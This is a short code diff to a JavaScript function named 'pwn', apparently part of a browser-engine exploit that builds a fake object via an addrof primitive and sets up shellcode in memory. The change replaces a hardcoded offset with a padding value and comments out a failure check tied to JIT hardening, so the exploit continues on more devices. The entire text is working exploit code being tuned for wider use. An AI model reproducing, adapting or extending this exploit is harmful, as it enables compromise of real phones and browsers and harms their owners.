@@ -169,7 +169,7 @@ var pwn = function() {
 
     print("Using padding: "+_off.padding);
     
-    var fake_addr = stage1.addrof(outer) + 0x20;
+    var fake_addr = stage1.addrof(outer) + _off.padding;
     
     if(verbosity >= VERBOSITY_HIGH) print('fake object is at ' + hex(fake_addr));
     
@@ -304,7 +304,7 @@ var pwn = function() {
     //JIT Hardening stuff
     if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
         // Probably an older phone, should be even easier
-        fail(3);
+       // fail(3);
     }
     
     if(verbosity === VERBOSITY_VERBOSE) print("Setting up shellcode in memory...");
